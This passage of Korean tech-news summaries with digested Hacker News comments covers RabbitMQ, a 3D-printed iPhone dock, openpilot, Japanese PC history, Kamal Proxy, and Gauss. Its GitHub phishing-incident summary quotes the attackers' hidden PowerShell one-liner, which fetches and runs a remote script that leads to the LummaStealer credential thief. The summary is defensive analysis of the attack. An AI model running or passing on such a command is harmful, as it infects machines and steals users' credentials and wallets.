          + 웹소켓을 통한 MQTT 문서 링크
     * 참고로, NATS도 MQTT를 지원함
          + NATS의 MQTT 지원 문서 링크
     * SNS/SQS에서 RabbitMQ로 이동해야 하는 이유는 무엇인지 궁금함
          + 우리의 SaaS는 초당 약 20개의 이벤트를 처리함
     * Jepsen 스타일 테스트를 통과하는지 알고 싶음
     * EMQX, NanoMQ, FlashMQ와 비교했을 때 장단점이 궁금함
     * RabbitMQ에 대한 무료 지원이 더 이상 없는 것처럼 보임
     * Celery가 기본적으로 RabbitMQ와 호환되는지 궁금함
"
"https://news.hada.io/topic?id=16903","디터 람스에 영감 받은 iPhone 독 디자인","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       디터 람스에 영감 받은 iPhone 독 디자인

     * Dieter Rams와 그의 동료들이 디자인한 알람 시계는 매우 아름다움
     * Braun의 다양한 빈티지 책상 및 알람 시계 디자인을 오랫동안 찾아다님
     * DN 40 모델을 찾기 위해 Braun Collector's Fair에 방문했으나 상태 좋은 제품을 찾기 어려움

  현재 문제

     * 침대 옆 탁자에 많은 물건이 있어 공간이 부족함
     * 시계, 보청기, 시계, 펜 등을 놓을 트레이가 필요함
     * 아이폰 MagSafe 충전기를 사용 중이나 공간이 협소하고 사용이 불편함

  해결책 탐색

     * YouTube 비디오를 보고 아이폰의 Standby 모드에 대한 새로운 관점을 얻음
     * Scott Yu-Juan과 Overwerk의 Braun DN 40에서 영감을 받은 디자인을 3D 프린팅함
     * 그러나 이 디자인도 공간을 많이 차지하고 MagSafe 충전기를 접착제로 고정해야 하는 문제점이 있음

  새로운 디자인 시도

     * Braun의 최신 알람 시계 BC21에서 영감을 얻음
     * BC21은 현대적인 사용자에게 맞춘 다목적 디자인으로, 무선 충전 패드와 알람 시계 기능을 결합함
     * 모든 물건(트레이, 충전기, 시계)을 하나로 결합하는 아이디어를 떠올림

  프로토타입 제작

     * 가죽 트레이를 사용하여 시계를 보호하는 첫 번째 프로토타입을 제작함
     * MagSafe 부분이 마음에 들지 않아 여러 번 디자인을 수정함
     * 아이폰의 곡선 모양을 맞추기 위해 G2 곡률을 적용함
     * 최종적으로 BC21에서 영감을 받은 디자인을 완성하고 인터넷에 공유함

  디자인 개선

     * 친구들의 피드백을 받아 디자인을 더 둥글게 수정함
     * Braun 550 헤어 드라이어와 Jaro Gielen의 ""Soft Electronics"" 책에서 영감을 받아 더 컬러풀하게 제작함
     * 최종 디자인은 더 편안하고 날카로운 모서리가 없음

  최종 수정

     * 케이블 채널 최적화 등 추가적인 수정 작업을 거침
     * 3D 프린팅과 CAD 소프트웨어를 통해 다양한 예술적 시도를 할 수 있었음

  결과물 공유

     * 3D 모델을 무료로 제공하며, Gumroad 페이지를 통해 기부를 받을 수 있도록 함

GN⁺의 정리

     * 이 기사는 디자인과 3D 프린팅을 통해 실용적이고 아름다운 아이폰 도크를 만드는 과정을 다룸
     * Dieter Rams의 디자인 철학과 현대적인 기능을 결합한 점이 흥미로움
     * 3D 프린팅과 CAD 소프트웨어를 활용한 창의적인 문제 해결 방법을 보여줌
     * 비슷한 기능을 가진 제품으로는 Twelve South의 HiRise 도크를 추천함

   오 엄청 예쁘네요. 진짜 탁상시계 같아요 ㅋㅋ

   출력물이 깔끔해서 왜 후가공 단계 내용이 없냐는 해커뉴스 댓글 질문이 있었는데, 사용된 3D프린터는 Bambulab X1C이라고 합니다

   3D 프린터가 있으면 출력해 볼수 있습니다 ;)

   원작자가 Gumrod에 올린 것은 아이폰 16/15/14 Pro 버전만 지원합니다.

   글에 포함된 Scott Yu-Juan 의 스탠드 버전은 여기에 있습니다.
   https://makerworld.com/en/models/615378
   다른 사용자들이 12~15 까지의 프로 맥스까지 지원하게 만들거나, 애플 워치도 포함한 버전도 같이 올려놨으니 참고하세요.

   그리고 누구나 아이폰 12~15까지 모든 버전을 만들 수 있도록 Fusion 360 파일도 올라왔네요
   https://makerworld.com/en/models/617129

   전 몇일 기다려보고 여러 디자인중에 골라서 출력하려고 합니다.

        Hacker News 의견

     * OP는 질문에 답변할 준비가 되어 있음
     * 손 도구 목공예가로서 나무 블록으로 비슷한 것을 만들고 싶음
     * Apple의 iSight 카메라에서 영감을 받은 버전을 기대했음
     * 작업에 대한 칭찬과 영감을 받았음을 표현함
     * Fatih의 여정을 존경하며, 그의 성취를 축하함
     * 디자인이 마음에 들지만 복잡해 보임
          + MagSafe를 사용하여 전화기를 쉽게 부착할 수 있도록 단순한 블록 디자인을 원함
          + TwelveSouth HiRise 3처럼 MagSafe 부분이 더 잘 통합되었으면 좋겠음
     * 3D 프린팅과 디자인의 가능성을 보여주는 훌륭한 예시임
     * 작년에 MagSafe 스탠드를 디자인하려 했으나 복잡해서 다른 사람의 디자인을 사용했음
          + 링크
     * CAD 소프트웨어와 3D 프린터로 할 수 있는 일에 놀라움을 느낌
     * Arduino와 같은 프로젝트에 적합한 부품을 찾기 어려워 3D 프린팅에 관심이 있음
          + 초보자에게 적합하고 품질 좋은 3D 프린터 추천을 원함
     * 처음에는 회의적이었지만 점점 더 마음에 들게 되었음
          + ""Spectical""이라는 단어가 ""skeptical""보다 더 나은 표현일 수 있음
     * Apple Watch 충전 기능을 추가하여 Etsy에 판매할 것을 제안함
     * 오래된 iPhone을 클라우드 연결 알람 시계로 사용할 수 있을 것 같음
     * Pixel 9 Pro에 맞는 CAD 파일을 원함
          + Android용 ""Standby Mode""와 유사한 솔루션을 찾고 있음
          + Daydream-Screensaver는 전화기를 매우 뜨겁게 하고 밝음
"
"https://news.hada.io/topic?id=16875","Openpilot – 로봇 공학 운영 체제","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                        Openpilot – 로봇 공학 운영 체제

openpilot

   openpilot는 로봇 운영 체제임 현재 275개 이상의 지원 차량에서 운전자 보조 시스템을 업그레이드함

    Docs · Roadmap · Contribute · Community · Try it on a comma 3X

   Quick start: bash <(curl -fsSL openpilot.comma.ai)

  자동차에서 openpilot 사용 시작하기

   자동차에서 openpilot을 사용하려면 네 가지가 필요함:
    1. 지원 장치: comma 3/3X, comma.ai/shop에서 구매 가능
    2. 소프트웨어: comma 3/3X 설정 절차에서 사용자 지정 소프트웨어 URL 입력 가능. openpilot.comma.ai URL을 사용하여 릴리스 버전 설치
    3. 지원 차량: 275개 이상의 지원 차량 중 하나를 보유해야 함
    4. 차량 하네스: comma 3/3X를 차량에 연결하기 위한 차량 하네스 필요

   차량 하네스와 장치를 설치하는 방법에 대한 자세한 지침이 있음. 다른 하드웨어에서도 openpilot을 실행할 수 있지만, 플러그 앤 플레이는 아님

  openpilot 개발 시작하기

   openpilot은 comma와 사용자들이 함께 개발함. GitHub에서 풀 리퀘스트와 이슈를 환영함
     * 커뮤니티 Discord에 참여
     * 기여 문서 확인
     * openpilot 도구 확인
     * 개발 워크플로우에 대해 읽기
     * 코드 문서는 https://docs.comma.ai에 있음
     * openpilot 실행에 대한 정보는 커뮤니티 위키에 있음

   openpilot 작업으로 보수를 받고 싶다면? comma는 외부 기여자에게 많은 보상을 제공하며 채용 중임

  안전 및 테스트

     * openpilot은 ISO26262 지침을 준수하며, 자세한 내용은 SAFETY.md 참조
     * openpilot은 모든 커밋에 대해 소프트웨어 인 더 루프 테스트를 실행함
     * 안전 모델을 강제하는 코드는 panda에 있으며 C로 작성됨, 자세한 내용은 code rigor 참조
     * panda는 소프트웨어 인 더 루프 안전 테스트를 가짐
     * 내부적으로는 하드웨어 인 더 루프 Jenkins 테스트 스위트를 사용하여 다양한 프로세스를 빌드하고 단위 테스트함
     * panda는 추가적인 하드웨어 인 더 루프 테스트를 가짐
     * 최신 openpilot은 10개의 comma 장치가 경로를 지속적으로 재생하는 테스트 클로젯에서 실행됨

  라이선스

   openpilot은 MIT 라이선스 하에 배포됨. 일부 소프트웨어는 다른 라이선스 하에 배포됨

   이 소프트웨어의 사용자는 Comma.ai, Inc. 및 그 이사, 임원, 직원, 대리인, 주주, 계열사, 하청업체 및 고객을 모든 주장, 소송, 요구, 손해, 책임, 의무, 손실, 합의, 판결, 비용 및 경비(변호사 비용 및 비용 포함)로부터 면책하고 보호해야 함

   이 소프트웨어는 연구 목적으로만 제공되는 알파 품질 소프트웨어임. 제품이 아님. 현지 법률 및 규정을 준수할 책임은 사용자에게 있음. 명시적 또는 묵시적 보증 없음

  사용자 데이터 및 comma 계정

   기본적으로 openpilot은 운전 데이터를 서버에 업로드함. comma connect를 통해 데이터에 접근 가능. 데이터를 사용하여 더 나은 모델을 훈련하고 openpilot을 개선함

   openpilot은 오픈 소스 소프트웨어로, 사용자가 데이터 수집을 비활성화할 수 있음

   openpilot은 도로를 향한 카메라, CAN, GPS, IMU, 자기 센서, 열 센서, 충돌 및 운영 체제 로그를 기록함. 운전자를 향한 카메라는 설정에서 명시적으로 선택한 경우에만 기록됨. 마이크는 녹음되지 않음

   openpilot을 사용함으로써 개인정보 보호정책에 동의함. 이 소프트웨어 또는 관련 서비스를 사용하면 특정 유형의 사용자 데이터가 생성되며, 이는 comma의 재량에 따라 기록되고 저장될 수 있음. 이 계약을 수락함으로써 이 데이터를 사용할 수 있는 취소 불가능하고 영구적인 전 세계적 권리를 comma에 부여함

GN⁺의 정리

     * openpilot은 로봇 운영 체제로, 275개 이상의 차량에서 운전자 보조 시스템을 업그레이드함
     * comma 3/3X 장치와 지원 차량, 소프트웨어, 차량 하네스가 필요함
     * GitHub에서 기여를 환영하며, 커뮤니티와 함께 개발됨
     * ISO26262 지침을 준수하며, 다양한 테스트를 통해 안전성을 보장함
     * MIT 라이선스 하에 배포되며, 사용자 데이터는 comma 서버에 업로드됨

   openpilot은 자율 주행 기술에 관심 있는 사람들에게 매우 유용하며, 관련 법률 및 규정을 준수해야 함. 비슷한 기능을 가진 프로젝트로는 Tesla의 Autopilot과 Waymo가 있음

        Hacker News 의견

     * Dodge Ram을 소유하고 있는 사용자는 Comma 3x를 사용하여 장거리 운전에서 더 자신감 있고 편안한 경험을 했음
          + OpenPilot, Sunnypilot, Frogpilot은 완전 자율 주행(FSD)은 아니지만, 핸즈프리 운전 보조 기능을 제공함
          + 2020 Ram 모델은 매우 잘 작동하며, 최신 운전 모델은 매우 부드럽고 교통 상황을 잘 처리함
          + 전통적인 자동차 제조업체가 Comma를 인수하면 유용한 운전 보조 기능을 빠르게 확보할 수 있을 것임
     * 275개의 자동차 모델이 자율 주행에 필요한 모든 액추에이터를 포함하고 있다는 사실이 놀라움
     * Hyundai Ioniq 5를 선택한 이유는 OpenPilot과 호환되기 때문이며, 운전 경험을 크게 개선했음
          + ""make driving chill""이라는 슬로건처럼 실제로 그 약속을 이행함
     * Sunnypilot의 한 모드는 페달을 제어하지만 핸들을 잡지 않아도 되는 기능을 제공함
          + 이 모드에서는 주의를 기울이게 되며, 브레이크를 제어하기 때문에 대부분의 문제를 쉽게 피할 수 있음
          + 핸들을 잡지 않아도 되는 점이 경험을 훨씬 더 쾌적하게 만듦
          + 전통적인 차선 유지 시스템에서는 가속기와 브레이크 제어에서 가장 많은 실수가 발생함
          + 이 모드는 완전한 핸즈프리 및 풋프리 운전 모드보다 안전할 가능성이 높음
     * 이 시스템이 매우 멋지지만 몇 가지 의문이 있음
          + 이 시스템이 합법적인지 여부와 그 이유
          + 기능 안전성과 많은 테스트를 논의하지만, 테스트 결과에 대한 데이터를 보고 싶음
          + 일화적인 비디오가 쉽게 찾을 수 있지만, 대량 데이터나 통계는 찾기 어려움
     * Comma가 여전히 존재하는 이유는 놀랍지 않음
          + 최소한의 VC 자금, 100명 이하의 직원, 매달 급격히 증가하지 않는 인력, 수익성 있는 제품 판매
          + 많은 스타트업이 3개월마다 자금을 추구하는 반면, Comma는 AI 열풍 이전에 자체 모델을 보유하고 있음
     * Openpilot을 오랫동안 팔로우해왔으며, 지원되는 차가 있다면 사용할 의향이 있음
          + 요즘 대부분의 자동차가 '꽤 좋은' ADAS를 제공하며, 일부 상황에서는 '핸즈프리' 기능도 있음
          + DIY와 공장 기본 설정을 비교할 때 얼마나 가치가 있는지 궁금함
     * 호환되지 않는 자동차에 추가 하드웨어를 설치하여 호환 가능하게 만들 수 있는지 궁금함
     * 법 집행 기관이라면 저장된 비디오를 얻기 위해 손을 비빌 것임
     * 잠시 동안 이 시스템이 내가 기다려온 ROS 대안인 줄 알았음
"
"https://news.hada.io/topic?id=16882","일본 PC 플랫폼의 변화","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             일본 PC 플랫폼의 변화

    일본 PC 플랫폼에 무슨 일이 있었나?

      플레이어 소개

     * 과거에는 다양한 컴퓨터 플랫폼이 존재했음
     * 북미는 IBM PC/Mac 듀오폴리로 일찍 정착했지만, 유럽과 일본은 다양한 컴퓨터가 존재했음
     * 16비트 컴퓨터 시대의 주요 일본 플랫폼: NEC의 PC-98, Fujitsu의 FM Towns, Sharp의 X68000

      전환기의 PC-98

     * DOS는 하드웨어와 직접 소통하는 얇은 운영체제였음
     * PC-98과 FM Towns는 DOS 기반 운영체제를 사용했지만, IBM PC와는 호환되지 않았음
     * NEC와 Microsoft는 PC-98에 Windows를 포팅함
     * Windows 95 출시 후, 소프트웨어 호환성이 생겨 PC-98과 IBM PC의 구분이 흐려짐
     * NEC는 IBM 호환 PC도 생산하기 시작했음
     * PC-98은 서서히 사라지고 다른 시스템과 통합됨

      FM Towns

     * FM Towns는 GUI 기반 운영체제인 Towns OS를 사용했지만, Windows 3와 95에 비해 원시적이었음
     * Fujitsu와 Microsoft는 Windows를 FM Towns에 포팅함
     * FM Towns는 점차 Windows PC로 대체됨

      CPU 전쟁에서 패배한 X68000

     * X68000은 Motorola의 68000 시리즈 CPU를 사용했음
     * Windows를 포팅할 수 없어 경쟁에서 밀려남
     * Sharp는 Windows PC로 전환했지만 기존 사용자들을 데려올 방법이 없었음

      멀티태스킹의 유혹

     * Windows의 멀티태스킹 기능이 시장 통합을 촉진함
     * 여러 프로그램을 동시에 사용할 수 있는 기능이 중요해짐
     * Windows 95는 소프트웨어 기반이 커서 경쟁이 어려웠음
     * NEC와 Fujitsu는 Windows를 도입하여 사용자들에게 제공함

      게임 시장의 변화

     * 16비트 시대에 FM Towns와 X68000은 강력한 2D 게임 하드웨어를 가졌음
     * 32비트 콘솔의 등장으로 경쟁력이 약화됨
     * Sony의 PlayStation 마케팅이 성인 게이머를 타겟으로 하여 컴퓨터 게이머들이 콘솔로 이동하게 만듦

      8비트 플랫폼은?

     * 일본의 8비트 컴퓨터 플랫폼은 16비트 컴퓨터로 대체됨
     * MSX는 16비트 진화를 이루지 못해 사용자들이 Windows PC로 이동함

      결론

     * 16비트 일본 컴퓨터 제조업체들은 표준 Windows PC를 만들기 시작했음
     * Microsoft가 시장을 장악했지만, 회사들은 살아남았음

    GN⁺의 정리

     * 일본의 16비트 컴퓨터 플랫폼은 Windows의 등장과 함께 서서히 사라졌음
     * NEC와 Fujitsu는 Windows PC로 전환하여 생존했음
     * 멀티태스킹 기능이 시장 통합을 촉진했음
     * 게임 시장의 변화와 Sony의 마케팅이 컴퓨터 게이머들을 콘솔로 이동하게 만듦
     * MSX와 같은 8비트 플랫폼은 16비트 진화를 이루지 못해 사용자들이 Windows PC로 이동함

        Hacker News 의견

     * SuperH 프로세서는 1990년대 후반 Hitachi가 개발한 일본 디자인의 하이브리드 RISC 프로세서임
          + SH2는 Sega Saturn 게임 콘솔에 사용되었고, SH4는 Sega Dreamcast에 사용되었음
          + 1997년 아시아 경제 위기 동안 Hitachi는 Mitsubishi와 협력하여 Renesas라는 새로운 회사를 설립했으나, SuperH의 개발은 중단되었음
     * Hitachi Peach는 Apple II를 연상시키는 6809 머신으로, Microsoft Basic과 독점 OS를 사용했음
          + 매뉴얼의 일부는 일본어로 되어 있었음
     * 일본 PC는 서양 시장과 달리 복잡한 문자 체계로 인해 더 큰 ROM, 고해상도 디스플레이, 복잡한 키보드 시스템이 필요했음
          + 초기 PC-98은 128KB RAM과 640x400 디스플레이를 제공했음
          + IBM-PC는 16KB RAM과 CGA 그래픽을 제공했음
     * 일본 시장은 분열되어 있었고, 소프트웨어 포팅 비용이 높았음
          + 일본 시스템의 평균 사용자는 더 비싼 하드웨어에서 소프트웨어 라이브러리가 적었음
     * Toshiba 노트북은 2012-14년 사이에 시장에서 사라졌음
          + 내구성이 뛰어나고 가격 대비 품질이 좋았음
     * 일본 여행 중 FM Towns나 FM Towns Marty를 찾으려 했으나, 찾기 어려웠음
     * 1990년대 후반 대만에서 PE2 편집기가 매우 인기가 있었음
          + 매크로를 쉽게 정의할 수 있어 중국어 텍스트를 생성하기 쉬웠음
     * DOS는 2024년의 OS보다 훨씬 얇은 OS였음
          + DOS 소프트웨어는 하드웨어나 특정 클래스의 드라이버에 직접 접근했음
     * MSX는 일본에서 일본어 문자 세트를 가지고 있었음
          + 주류 워드 프로세싱에 충분했는지 궁금함
     * 서양의 많은 PC 플랫폼이 Microsoft나 Apple에 밀려 사라졌음
          + Commodore, Atari, Acorn, Sinclair 등 많은 회사들이 경쟁에서 밀려났음
     * 1994년에는 32비트 콘솔이 등장하여 2D 게임과 3D 게임을 더 잘 처리할 수 있었음
          + 이는 Commodore의 Amiga와 유사한 상황이었음
          + Doom 게임이 Amiga 플랫폼을 압도했음
"
"https://news.hada.io/topic?id=16880","제로 다운타임 배포를 위한 최소한의 HTTP 프록시, Kamal Proxy","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               제로 다운타임 배포를 위한 최소한의 HTTP 프록시, Kamal Proxy

Kamal Proxy - 최소한의 HTTP 프록시로 무중단 배포를 지원

  기능

     * Kamal Proxy는 HTTP 프록시로, 무중단 배포를 쉽게 조율할 수 있도록 설계됨
     * Kamal Proxy 뒤에서 웹 애플리케이션을 실행하면, 진행 중인 트래픽을 중단하지 않고 변경 사항을 배포할 수 있음
     * 애플리케이션의 특별한 협력 없이도 작동 가능함
     * Kamal의 일부로 설계되었지만, 독립적으로 또는 다른 배포 도구와 함께 사용할 수 있음

  간단한 개요

     * 프록시 인스턴스를 실행하려면 kamal-proxy run 명령어를 사용함
     * 설정 파일은 없지만, 기본값이 애플리케이션에 맞지 않으면 옵션을 지정할 수 있음
     * 예를 들어, 기본 포트 80이 아닌 다른 포트에서 프록시를 실행하려면: kamal-proxy run --http-port 8080
     * 전체 옵션 목록을 보려면 kamal-proxy help run을 실행함

    트래픽 라우팅

     * 프록시를 통해 웹 애플리케이션으로 트래픽을 라우팅하려면 애플리케이션 인스턴스를 프록시에 deploy함
     * 인스턴스를 배포하면 프록시에서 사용할 수 있게 되며, 이전에 사용하던 인스턴스를 대체함
     * 인스턴스를 지정할 때 hostname:port 형식을 사용함
     * 예를 들어: kamal-proxy deploy service1 --target web-1:3000
     * 프록시는 web-1:3000을 service1 서비스 이름으로 등록하고, HTTP 상태 검사를 즉시 시작함
     * 인스턴스가 일정 시간 내에 정상 상태가 되지 않으면 deploy 명령어는 배포를 중단하고 비정상 종료 코드를 반환함
     * 각 배포는 이전에 배포된 인스턴스의 모든 트래픽을 인계받음
     * 새로운 인스턴스가 정상 상태가 되면 모든 새로운 트래픽을 해당 인스턴스로 라우팅함
     * deploy 명령어는 이전 인스턴스에서 트래픽이 완전히 소진될 때까지 기다림
     * 따라서 deploy가 성공적으로 반환되면 이전 인스턴스를 제거해도 진행 중인 요청이 중단되지 않음
     * 새로운 인스턴스가 정상 상태가 될 때까지 트래픽이 라우팅되지 않으며, 이전 인스턴스에서 트래픽이 완전히 소진된 후 제거되므로 무중단 배포가 가능함

    호스트 기반 라우팅

     * 호스트 기반 라우팅을 통해 동일한 서버에서 여러 애플리케이션을 실행할 수 있음
     * 인스턴스를 배포할 때 트래픽을 제공할 호스트를 지정할 수 있음
     * 예를 들어: kamal-proxy deploy service1 --target web-1:3000 --host app1.example.com
     * 이렇게 배포된 인스턴스는 지정된 호스트에 대해서만 트래픽을 받음
     * 각 호스트에 대해 고유한 인스턴스를 배포하여 동일한 서버에서 포트 충돌 없이 여러 애플리케이션을 실행할 수 있음
     * 특정 호스트는 한 번에 하나의 서비스만 라우팅할 수 있음
     * 예를 들어: kamal-proxy deploy service1 --target web-1:3000 --host app1.example.com 후 kamal-proxy deploy service2 --target web-2:3000 --host app1.example.com을 실행하면 오류가 발생함
     * kamal-proxy remove service1 후 kamal-proxy deploy service2 --target web-2:3000 --host app1.example.com을 실행하면 성공함

    자동 TLS

     * Kamal Proxy는 애플리케이션을 위한 TLS 인증서를 자동으로 획득하고 갱신할 수 있음
     * 인스턴스를 배포할 때 --tls 플래그를 추가하여 활성화할 수 있음
     * 예를 들어: kamal-proxy deploy service1 --target web-1:3000 --host app1.example.com --tls

  환경 변수로 run 옵션 지정

     * Docker 컨테이너에서 실행할 때와 같은 환경에서는 환경 변수를 사용하여 run 옵션을 지정하는 것이 편리할 수 있음
     * 예를 들어, HTTP 포트를 설정하려면: kamal-proxy run --http-port 8080 또는 HTTP_PORT=8080 kamal-proxy run
     * 환경 변수가 다른 것과 충돌할 경우, KAMAL_PROXY_ 접두사를 붙여 구분할 수 있음
     * 예를 들어: KAMAL_PROXY_HTTP_PORT=8080 kamal-proxy run

  빌드

     * Go 환경이 설정되어 있다면 로컬에서 Kamal Proxy를 빌드할 수 있음: make
     * 또는 Docker 컨테이너로 빌드할 수 있음: make docker

  시도해보기

     * 예제 폴더에서 Docker Compose 설정을 확인하여 프록시 명령어를 시도해볼 수 있음

GN⁺의 정리

     * Kamal Proxy는 무중단 배포를 지원하는 최소한의 HTTP 프록시로, 애플리케이션의 특별한 협력 없이도 작동함
     * 호스트 기반 라우팅과 자동 TLS 기능을 제공하여 여러 애플리케이션을 동일한 서버에서 실행할 수 있음
     * 환경 변수로 run 옵션을 지정할 수 있어 Docker와 같은 환경에서 유용함
     * 무중단 배포를 위해 트래픽을 새로운 인스턴스로 라우팅하고, 이전 인스턴스에서 트래픽이 완전히 소진될 때까지 기다림
     * 비슷한 기능을 제공하는 프로젝트로는 NGINX, HAProxy 등이 있음

        Hacker News 의견

     * 'deploy' 용어 사용이 혼란스러움
          + 'bind', 'intercept', 'proxy' 같은 용어가 더 적절할 것 같음
     * 무중단 배포를 위해 전체 시스템을 구축하는 것은 과도함
          + Unix 소켓을 지원하는 앱+웹 프록시로도 무중단 배포 가능
     * Kamal 프록시는 Docker Swarm의 문제를 해결하기 위해 존재함
          + Cloud 66에서는 Caddy와 Traefik을 사용했음
     * Kamal이 Swarm을 선택한 이유가 궁금함
          + 단순함 때문일 수도 있음
          + 복잡성은 숨길 수 없고, 결국 자체 프록시를 만들게 됨
     * Kamal 프록시를 사용해보지 않았지만, 지원 문제로 인해 회의적임
          + WebSockets, SSE, HTTP/3, 다양한 압축 및 암호화 지원 필요
     * HAProxy가 쉽게 할 수 있는 일 같음
          + hitless reload 기능이 있음
     * '트래픽 일시 중지' 패턴을 구현하는지 궁금함
          + 몇 초 동안 트래픽을 일시 중지하여 인프라 변경을 수행할 수 있음
     * 무중단 배포(ZDD)가 어떻게 작동하는지 궁금함
          + 두 버전의 앱이 동시에 실행되고, 새로운 트래픽이 새로운 버전으로 라우팅됨
          + DB 마이그레이션 문제는 어떻게 처리되는지 궁금함
     * Kamal 2가 auto-SSL을 지원하고, 한 서버에서 여러 앱을 쉽게 실행할 수 있게 할 것임
     * 사용 방법이 이해되지 않음
          + 예제에 따르면 'web' 서비스의 4개의 복제본을 시작함
          + 무중단 배포를 위해 새로운 타겟에 배포해야 함
          + docker compose up --build --force-recreate web 명령어가 모든 것을 무효화함
          + 명확한 지침이 필요함
     * 타임아웃을 설정할 수 있는 방법이 있는지 궁금함
     * NIH (Not Invented Here) 증후군임
"
"https://news.hada.io/topic?id=16857","GitHub 알림 이메일 악용한 악성코드 배포 사건","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      GitHub 알림 이메일 악용한 악성코드 배포 사건

     * 오픈 소스 개발자로서 GitHub에서 자주 이메일을 받음
     * 대부분의 이메일은 GitHub 사용자가 상호작용한 내용을 알리는 알림 이메일임
     * 그러나 일부 이메일은 GitHub 보안을 사칭하여 악성코드를 다운로드하게 함

  공격 방법

    1. 공격자가 임시 GitHub 계정을 사용해 공개 저장소에 이슈를 생성함
    2. 공격자가 이슈를 빠르게 삭제함
    3. 저장소 소유자는 알림 이메일을 받음
    4. 이메일의 링크를 클릭함
    5. 지시에 따라 시스템에 악성코드를 감염시킴

  이메일 메시지 분석

     * 이메일 내용은 대부분 공격자가 제어할 수 있음
     * 이메일에는 새로운 이슈가 생성되었다는 내용이 없음
     * 공격자는 ""Github Security Team""을 사칭함
     * 이메일은 GitHub에서 발송된 것이므로 피싱 체크를 통과함

  GitHub의 개선점

     * 이메일에 더 많은 맥락을 제공하여 공격의 효과를 줄일 수 있음
     * 공격자가 제어할 수 있는 콘텐츠를 줄이고 발신자에 대한 명확성을 높여야 함

  웹사이트

     * 이메일의 링크를 따라가면 캡차 페이지로 이동함
     * 캡차 페이지는 사용자가 Windows 실행 상자에 명령을 입력하도록 유도함

  악성코드

     * 사이트는 다음 명령을 클립보드에 복사함:
powershell.exe -w hidden -Command ""iex (iwr '[https://]2x[.]si/DR1.txt').Content""

     * 이 명령은 PowerShell 프로세스를 시작하고 스크립트를 다운로드하여 실행함

  악성코드 단계

    1. PowerShell 명령을 통해 스크립트를 다운로드하고 실행함
    2. 스크립트는 악성 실행 파일을 다운로드하고 실행함
    3. 실행 파일은 디지털 서명이 있지만 유효하지 않음
    4. Windows는 유효하지 않은 서명에 대해 경고하지 않음

  Windows의 약점

     * 인터넷에서 다운로드된 파일을 식별하는 ""Mark of the Web"" (MOTW) 플래그가 설정되지 않음
     * .NET Framework의 System.Net.WebClient 클래스는 MOTW 플래그를 설정하지 않음
     * MOTW 플래그가 설정되지 않은 경우 Windows는 유효하지 않은 서명에 대해 경고하지 않음

  악성코드 분석

     * 악성코드는 메모리에 로드되어 실행됨
     * LummaStealer라는 악성코드로, 암호화폐 지갑, 저장된 자격 증명 등을 탈취함

  결론

     * GitHub 알림 이메일의 약점을 악용한 공격 사례
     * 다양한 도구를 사용하여 분석을 수행함

GN⁺의 정리

     * 이 기사는 GitHub 알림 이메일을 악용한 악성코드 공격 사례를 다룸
     * GitHub의 이메일 시스템의 약점을 악용하여 악성코드를 배포함
     * Windows의 ""Mark of the Web"" 플래그와 디지털 서명 검증의 약점을 이용함
     * LummaStealer라는 악성코드가 사용됨
     * GitHub와 Microsoft에 보고된 약점들임
     * 유사한 기능을 가진 다른 프로젝트로는 Cyfirma의 분석 자료를 추천함

        Hacker News 의견

     * 최근 PayPal에서 매우 설득력 있는 이메일을 받았음
          + 누군가가 인용 기능을 사용하여 ""PayPal need to get in touch about a your recent payment of $499.00, please call +1-....""라는 회사 이름을 설정했음
          + 이메일은 실제 PayPal.com에서 왔으며, 이런 사용자 이름을 관리하지 않는 것이 이해되지 않음
          + 이를 보고했지만 아직 답변을 받지 못했음
          + 이 이메일은 진짜 PayPal 이메일처럼 보이도록 형식화되어 많은 사람들이 속을 것 같음
     * 사람들이 정말로 이런 사기에 속는지 궁금함
          + 이메일이 github에서 왔다는 것을 알고 있다고 가정함
          + 첫 번째 경고: 이메일이 실제 도메인의 변형으로 연결됨
          + 두 번째 경고: 캡차가 셸 명령을 입력하라고 요구함
     * 주니어 개발자들이 이런 사기에 속을 수 있을 것 같음
          + ""오, 코드 실행으로 캡차를 해결하다니, 참 신기하네!""
     * 웹페이지가 클릭만으로 복사/붙여넣기 버퍼를 채울 수 없어야 함
          + 이메일의 링크를 클릭하거나 이메일의 내용을 신뢰하지 말아야 함
          + Windows가 여전히 1줄의 PowerShell 명령으로 루트 권한을 허용하는 것이 문제임
     * Github는 자동화된 서비스로 링크를 확인하지 않고 이슈에 링크를 넣는 것을 막아야 함
          + Github는 이메일로 전송하는 내용을 더 잘 관리해야 함
     * github-scanner.com이 여전히 악성 파티인지 궁금함
          + Cloudflare가 DNS를 호스팅하고 있으며, 이 문제를 보고할 방법이 없음
     * 공격자가 이슈를 빠르게 삭제함
          + 관리자만 이슈를 삭제할 수 있음
          + 따라서 저장소에는 이슈의 흔적이 남아 있음
     * 좋은 글임, Julia Evans의 블로그와 비슷한 느낌을 줌
     * 2024년에도 여전히 가장 간단한 속임수에 속는 사람들이 있다는 것이 슬픔
     * 오늘 아침에 이런 알림을 받았고 무시했음
          + 알림이 특정 저장소에 관한 것이었음
     * 읽을 가치가 있음, 그들이 무엇을 하려고 하는지 보여줌
          + 링크만으로도 의심스러울 수 있지만, 누군가가 이를 파헤치는 것을 보는 것이 재미있음
     * 비슷한 GitHub 알림 이메일을 받았음
          + 저장소에서 취약성이 발견되었다고 했지만, 클릭하지 않았음
          + 게으른 프로그래머라서 클릭하지 않았음
"
"https://news.hada.io/topic?id=16827","가우스가 묘비에 Heptadecagon을 원한 이유","                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      가우스가 묘비에 Heptadecagon을 원한 이유

  왜 이 위대한 수학자는 묘비에 17각형을 원했을까

     * 수학자 가우스는 많은 수학적 업적을 남겼음
     * 그 중에서도 묘비에 ""정17각형""을 새기고 싶어했음
     * 18세에 가우스는 2,000년 동안 수학자들을 괴롭혀온 문제를 정17각형을 이용해 해결했음

    고대 그리스 기하학

     * 고대 그리스인들은 기하학에 뛰어났으며, 컴퍼스와 자를 사용한 도형 구성에 중점을 두었음
     * 컴퍼스는 두 점을 중심으로 원을 그리는 도구이며, 자는 직선을 그리는 도구임
     * 이 도구들은 거리를 측정하거나 각도를 재지 못함
     * 이러한 도형 구성은 유클리드의 원론에서 비롯되었음
     * 유클리드는 최소한의 가정으로 모든 기하학을 유도하려 했음

    도형 구성 예제

     * 주어진 선분의 중점을 찾는 방법
          + 컴퍼스를 사용해 두 점을 중심으로 원을 그림
